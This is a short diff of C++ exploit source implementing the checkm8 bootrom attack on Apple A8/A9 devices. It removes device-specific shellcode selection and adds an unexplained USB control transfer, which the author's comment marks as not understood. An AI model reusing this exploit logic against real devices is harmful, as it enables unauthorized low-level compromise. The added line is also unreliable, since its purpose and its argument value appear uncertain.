@@ -744,16 +744,6 @@ void checkm8_A8_A9()
         return;
     }
 
-    // Get shellcode
-    vector<uint8_t> Shellcode;
-
-    auto serial = D.getSerialNumber();
-    if (serial.find("CPID:7000 CPRV:11") != string::npos)
-        Shellcode = getS7000Shellcode();
-    else if (serial.find("CPID:8000 CPRV:20") != string::npos ||
-        serial.find("CPID:8003 CPRV:01") != string::npos)
-        Shellcode = getS8000Shellcode();
-
     printf("[*] stage 1, usb setup, send 0x800 of 'A', sends no data\n");
 
     memset(&payload, '\0', sizeof(checkra1n_payload_t));
@@ -775,6 +765,9 @@ void checkm8_A8_A9()
     std::vector<uint8_t> A800;
     A800.insert(A800.end(), 0x800, 'A');
     D.libusb1_async_ctrl_transfer(0x21, 1, 0, 0, A800, 0.002);
+    //? what the heck is that???
+    D.libusb1_no_error_ctrl_transfer(21, 1, 0, 0, AAAA, 64, 0);
+    //?
 
     D.libusb1_no_error_ctrl_transfer(0, 0, 0, 0, AAAA, 704, 100);
     D.libusb1_no_error_ctrl_transfer(0x21, 4, 0, 0, 0, 0, 0);
